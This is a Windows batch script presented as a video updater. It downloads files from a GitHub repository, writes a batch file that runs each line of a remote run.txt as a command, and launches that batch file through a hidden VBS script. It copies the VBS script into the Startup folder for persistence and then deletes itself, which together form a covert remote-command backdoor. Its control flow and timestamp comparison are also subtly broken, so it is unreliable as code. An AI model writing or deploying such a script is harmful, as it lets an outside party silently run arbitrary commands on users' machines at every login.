@echo off
:: Define paths and URLs
set download_folder=%USERPROFILE%\dd
set github_base=https://raw.githubusercontent.com/lkrtgy/hi/main
set video_url=%github_base%/yourvideo.mp4
set config_url=%github_base%/config.txt
set run_url=%github_base%/run.txt
set local_video=%download_folder%\yourvideo.mp4
set local_config=%download_folder%\config.txt
set local_run=%download_folder%\run.txt

:: Create the download folder if it doesn't exist
if not exist "%download_folder%" mkdir "%download_folder%"

:: Function to compare timestamps
:compare_files
setlocal
set remote_url=%1
set local_file=%2
set temp_file=%download_folder%\temp_file

:: Download file metadata using curl to get the Last-Modified timestamp
curl -I %remote_url% --silent > "%temp_file%"

:: Extract the Last-Modified date from the header
for /F "tokens=2 delims=:" %%A in ('findstr /i "Last-Modified" "%temp_file%"') do set remote_timestamp=%%A

:: Get the local file's timestamp
for /F "tokens=1-2 delims= " %%B in ('dir "%local_file%" ^| findstr "%local_file%"') do set local_timestamp=%%B

:: Compare timestamps
if "%local_timestamp%" NEQ "%remote_timestamp%" (
    :: Files are different, so download the new file
    echo Files are different. Downloading new version...
    curl -o "%local_file%" "%remote_url%" --silent
)

endlocal
exit /b
:: End of compare_files function

:: Check if video file needs updating
call :compare_files "%video_url%" "%local_video%"

:: Check if config file needs updating
call :compare_files "%config_url%" "%local_config%"

:: Check if run.txt file needs updating (optional)
if exist "%local_run%" (
    call :compare_files "%run_url%" "%local_run%"
)

:: Create the download_and_schedule.bat script
echo @echo off > "%download_folder%\download_and_schedule.bat"
echo timeout /t %video_delay% /nobreak >nul >> "%download_folder%\download_and_schedule.bat"
echo start "" "wmplayer.exe" /fullscreen "%local_video%" >> "%download_folder%\download_and_schedule.bat"

:: Optional: Execute commands from run.txt if it exists
if exist "%local_run%" (
    echo if exist "%local_run%" ( >> "%download_folder%\download_and_schedule.bat"
    echo     for /f "usebackq delims=" %%A in ("%local_run%") do ( >> "%download_folder%\download_and_schedule.bat"
    echo         %%A >> "%download_folder%\download_and_schedule.bat"
    echo     ) >> "%download_folder%\download_and_schedule.bat"
)

:: Create run_silently.vbs to execute silently
echo Set objShell = CreateObject("WScript.Shell") > "%download_folder%\run_silently.vbs"
echo objShell.Run "cmd /c ^""%download_folder%\download_and_schedule.bat^""", 0, False >> "%download_folder%\run_silently.vbs"

:: Copy run_silently.vbs to the Startup folder
set startup_folder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%download_folder%\run_silently.vbs" "%startup_folder%\run_silently.vbs" /Y >nul

:: Clean up the installer script
del "%~f0"
